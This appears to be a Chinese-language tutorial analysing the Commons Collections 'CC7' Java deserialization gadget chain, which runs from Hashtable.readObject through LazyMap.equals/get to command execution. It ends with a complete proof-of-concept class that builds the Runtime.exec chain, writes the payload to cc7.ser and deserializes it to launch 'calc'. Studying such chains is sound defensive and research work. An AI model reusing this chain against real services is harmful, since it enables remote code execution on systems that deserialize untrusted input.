1.链条总览

HashTable.readObject()

->HashTable.<font style="color:#080808;background-color:#ffffff;">reconstitutionPut()</font>

<font style="color:#080808;background-color:#ffffff;">->LazyMap.equals()</font>

<font style="color:#080808;background-color:#ffffff;">->LazyMap.get()</font>

<font style="color:#080808;background-color:#ffffff;">->ChainedTransformer.transform</font>

<font style="color:#080808;background-color:#ffffff;">->命令执行</font>

2.具体分析

 CC7 不再利用 HashMap.readObject()，而是利用 Hashtable.readObject() 在恢复哈希表时检测哈希冲突并调用 equals()。  

<!-- 这是一张图片，ocr 内容为：PRIVATE VOID READOBJECT(JAVA.IO.OBJECTINPUTSTREAM S) GULL S.REDULILL(/) THL ORTGTANGUIL INT ELEMENTS - S.READINT(); // COMPUTE NEW SIZE WITH A BIT OF ROOM 5% TO GROW BUT // NO LARGER THAN THE ORIGINAL SIZE. MA MAKE THE LENGTH // ODD IF IT'S LARGE ENOUGH, THIS HELPS DISTRIBUTE THE ENTRIES. // GUARD AGAINST THE LENGTH ENDING UP ZERO, THAT'S NOT VALID. INT LENGTH - (INT) (ELEMENTS * LOADFACTOR) + (ELEMENTS / 20) + 33 IF (1 (日) F (LENGTH > ELEMENTS && (LENGTH & 1) -- O LENGTH--; IF (ORIGLENGTH > 0 & LENGTH > ORIGLENGTH) LENGTH ORIGLENGTH; TABLE - NEW ENTRY<?, ?>[LENGTH]; (INT) MATH.MIN(LENGTH * LOADFACTOR, MAX_ARRAY_SIZE + 1); THRESHOLD O; COUNT 1/ READ THE NUMBER OF ELEMENTS AND THEN ALL THE KEY/VALUE OBJECTS OR (; ELEMENTS > O; ELEMENTS--) { FOR(G /UNCHECKED/ K KEY - (K) S.READOBJECT(); /UNCHECKED/ V VALUE ; (V) S.READOBJECT(); / SYNCH COULD BE ELIMINATED FOR PERFORMANCE RECONSTITUTIONPUT(TABLE, KEY, VALUE); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1783954237065-fd69c5bd-bcad-44d8-9f21-92ee8b9b58c1.png)

查看 HashTable 类的反序列方法，前面大概是做一个数据结构的恢复操作，重点在最后的循环中，首先循环对 key-vlaue 进行恢复，然后传入 reconstitutionPut 方法中，还传入了一个 table 元素，跟进该方法

<!-- 这是一张图片，ocr 内容为：D RECONSTITUTIONPUT(ENTRY<?, ?>[] TAB, K KEY, V VALUE) PRIVATE VOID STREAMCORRUPTEDEXCEPTION THROWS S  IF (VALUE - NULL) { THROW NEW JAVA.IO.STREAMCORRUPTEDEXCEPTION(); // MAKES SURE THE KEY IS NOT ALREADY IN THE HASHTABLE. // THIS SHOULD NOT HAPPEN IN DESERIALIZED VERSION. INT HASH - KEY.HASHCODE(); INT INDEX - (HASH & OX7FFFFFF) % TAB.LENGTH; NULL; E - E.NEXT) { FOR (ENTRY<?, ?> E - TAB[INDEXL; E !- NULL IF (E.HASH -- HASH) && E.KEY.EQUALS(KEY)) { THROW NEW JAVA.IO.STREAMCORRUPTEDEXCEPTION(); 了 T // CREATES THE NEW ENTRY. /UNCHECKED/ (ENTRY<K, V>) TAB[INDEX]; ENTRY<K, V> E NEW ENTRY<>(HASH, KEY, VALUE, E); TAB[INDEX] COUNT++; -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1783954333317-4fc022cf-54ab-4046-92f3-7a55e8b00073.png)

可以看到该方法会对传入的 key 进行一个 hashcode 方法的调用，那么这样的话在这里额就可以触发链子，和 cc6 完全一样，这里略过

继续往下，将得到的 hash 值对 tab 的长度进行一个取余操作，这个 tab 是一个链表结构，用来存放键值对，hash & 0x7FFFFFFF 将得到的 hash 值进与 0x7fffffff 也就是 0111 1111 111 进行一个与操作， 清除符号位， 确保参与取模时得到非负下标 ，避免数组越界

循环每次定义一个 entry 对象 e 为 tab[index]，也就是检查当前传入的 key 是否已经在 tab 中已经存在了，如果已经存在就比较键是否相同，因为存在 hash 冲突，两个不同的键也可能 hash 值相同，所以当发现有冲突时会继续比较键，而触法点就在 equals 方法

<!-- 这是一张图片，ocr 内容为：PUBLIC ABSTRACTMAPDECORATOR(MAP MAP) { IF (MAP - NULL) { 4 ILLEGALARGUMENTEXCEPTION("MAP MUST NOT BE NULL"); THROW NEW THIS.MAP MAPJ -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1783955890609-1f5c0eb9-bad9-401c-8d20-e8dcc98bde09.png)

<!-- 这是一张图片，ocr 内容为：PUBLIC BOOLEAN EQUALS(OBJECT OBJECT) THIS) IF (OBJECT RETURN TRUE; 了 RETURN MAP.EQUALS(OBJECT); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1783956111167-dfcd3982-0429-4a7d-a9e0-044201703cec.png)

equals 方法往往需要比较对象的属性，那么当比较 LazyMap 对象时会不会调用 get 取得键名去进行比较？从已知的 cc7 知道的确是利用 LazyMap

但是跟进 LazyMap 发现该类并没有实现 equals 方法，查找他的父类 AbstractMapDecorator，这个类是一个装饰器，本身也没有实现 equals 方法，而是调用 map.equals 去进行比较，而这个 map 就是动态绑定的 map 对象，也就是要装饰的 map 对象，对应的也就是 LazyMap 中我们传入的 map 属性，跟进 map 类的基类 AbstractMap

<!-- 这是一张图片，ocr 内容为：PUBLIC BOOLEAN EQUALS(OBJECT O) { IF THIS) RETURN TRUE; IF (!(O INSTANCEOF MAP<?, ?> M)) RETURN FALSE; IF (M.SIZE() !- SIZE()) RETURN FALSE; TRY FOR (ENTRY<K, V> E : ENTRYSET()) { K KEY E.GETKEY(); V VALUE E E.GETVALUE();  IF (VALUE - NULL) { && M.CONTAINSKEY(KEY))) IF (!(M.GET(KEY) NULL RETURN FALSE; ELSE { IF (!VALUE.EQUALS(M.GET(KEY))) FALSE; RETURN -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1783956349450-e34d3f64-df42-4a56-8b6e-5c48d0c77203.png)

查看 AbstractMap 类的 equals 方法，重点在循环中，这里 这里大概也就是比较一下两个 map 的键值是否相等，触发了 m.get(key)

那么后面的链子就是和 cc6 一样了，执行 ChainedTransformer 链

三,总结

直接给出代码

```java
public class App{
    public static void main(String[] args) throws Exception {
        Transformer[] fakeFormer = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] evilFormer = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(
                    "getMethod",
                    new Class[]{String.class, Class[].class},
                    new Object[]{"getRuntime", new Class[0]}
            ),
            new InvokerTransformer(
                    "invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, new Object[0]}
            ),
            new InvokerTransformer(
                    "exec",
                    new Class[]{String.class},
                    new Object[]{"calc"}
            )
        };

        ChainedTransformer chain = new ChainedTransformer(fakeFormer);

        Map innerMap1 = new HashMap();
        innerMap1.put("yy",1);
        Map innerMap2 = new HashMap();
        innerMap2.put("zZ",1);

        Map lazyMap1 = LazyMap.decorate(innerMap1,chain);
        lazyMap1.put("yy",2);
        Map lazyMap2 = LazyMap.decorate(innerMap2,chain);
        lazyMap2.put("zZ",2);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1,1);
        hashtable.put(lazyMap2,1);

        lazyMap2.remove("yy");

        Field field = chain.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chain,evilFormer);


        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("cc7.ser"));
        out.writeObject(hashtable);
        out.close();

        ObjectInputStream input = new ObjectInputStream(new FileInputStream("cc7.ser"));
        input.readObject();
        input.close();

    }
}
```

总结一下整个流程，就是利用 HashTable 在反序列化恢复数据结构时，会检查键名是否冲突，每当要插入一对键值对时都会对键进行 hash 确定存储的位置，如果需要存储的位置已经有值了就会调用 equals 方法对键进行比较，从而触发 HashMap.equals，进而触发 LazyMap.get()，执行整条链子

值得注意的是 HashTable 在进行 put 操作时同样会检查是否存在一个相同的 key

<!-- 这是一张图片，ocr 内容为：PUT(K KEY, V VALUE) ( SYNCHRONIZED PUBLIC NOT NULL IS MAKE SURE THE VALUE IF (VALUE } (TINU ; NULLPOINTEREXCEPTION(); THROW NEW 小 NE KEY IS NOT ALREADY IN THE HASHTABLE. THE MAKES SURE T ENTRY<?, ?> TAB[] - TABLE; INT HASH - KEY.HASHCODE(); INT INDEX - (HASH & OX7FFFFFFF) % TAB.LENGTH; /UNCHECKED/ ENTRY<K, V> ENTRY - (ENTRY<K, V>) TAB[INDEX]; FOR (; ENTRY !- NULL; ENTRY - ENTRY.NEXT) &&ENTRY.KEY.EQUALS(KEY)){ IF (ENTRY.HASH HASH) V OLD ENTRY VALUE; VALUE; ENTRY.VALUE RETURN OLD; -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1783957766652-b507c1a2-1f7e-4c3d-b7d3-1b09e8e077b7.png)

那么在我们进行 put 时就已经触发了链子，执行了 lazyMap2.eqauls(lazyMap1)，那么此时就会执行 lazyMap2.get("yy"),我们知道 lazyMap 在获取键失败时会调用工厂函数创建键并添加进 map，那么这就导致了两个问题，一个是此时 put 进去后键已经存在，那么后续进行反序列化时不会触发，因此要 lazyMap2.remove("yy"),第二个问题是我们的fakeFormer = new Transformer[]{new ConstantTransformer(1)}，调用工厂函数后会返回 1，导致导致 equals 可能为 true，所以在进行 put 是不能使用 value=1



